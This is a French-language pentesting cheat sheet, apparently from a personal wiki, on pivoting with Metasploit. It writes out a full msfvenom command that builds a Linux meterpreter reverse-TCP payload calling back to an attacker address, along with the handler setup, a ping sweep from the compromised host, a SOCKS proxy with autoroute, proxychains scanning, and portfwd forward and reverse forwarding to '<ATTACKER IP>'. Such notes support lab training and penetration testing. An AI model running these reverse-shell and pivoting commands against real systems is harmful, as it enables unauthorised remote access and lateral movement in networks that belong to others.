---
public: true # set to true to make the article publishable
---

- Générer un reverse shell avec [[msfvenom]]
- Après avoir exécuté le reverse shell et obtenu une session meterpreter :

## Scan des hôtes répondant à l'ICMP depuis la machine de rebond (pivot)

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.228 LPORT=2222 -f elf > shell-2222.elf

msf6> **use exploit/multi/handler
set LHOST tun0
set LPORT 2222
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run


```

## Pivot via Meterpreter

```
# 1 - Etablir une session meterpreter
use exploit/multi/handler
set LHOST tun0
set LPORT 2222
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# 2 - lancer le serveur socks
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 1080
set VERSION 4a
run

# 3 - Connecter le socks à notre session meterpreter (7 in the example)
use post/multi/manage/autoroute
set SESSION 7
run

# 4 - Tester avec proxychain
proxychains nmap $TARGET_IP -p3389 -sT -v -Pn

```

## Redirection de port via Meterpreter

```
Usage: portfwd [-h] [add | delete | list | flush] [args]
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.

# exemple rendant accessible localhost:1234 --> 1.2.3.4 depuis kali
meterpreter > portfwd add -l 1234 -p 3389 -r 1.2.3.4

# reverse port forwarding (on poura lancer un listener sur le port 1234)
meterpreter > portfwd add -R -l 2222 -p 1234 -L <ATTACKER IP>
   Traffic entrant --> Meterpreter client (port 2222) --> Attaquant (1234)
```
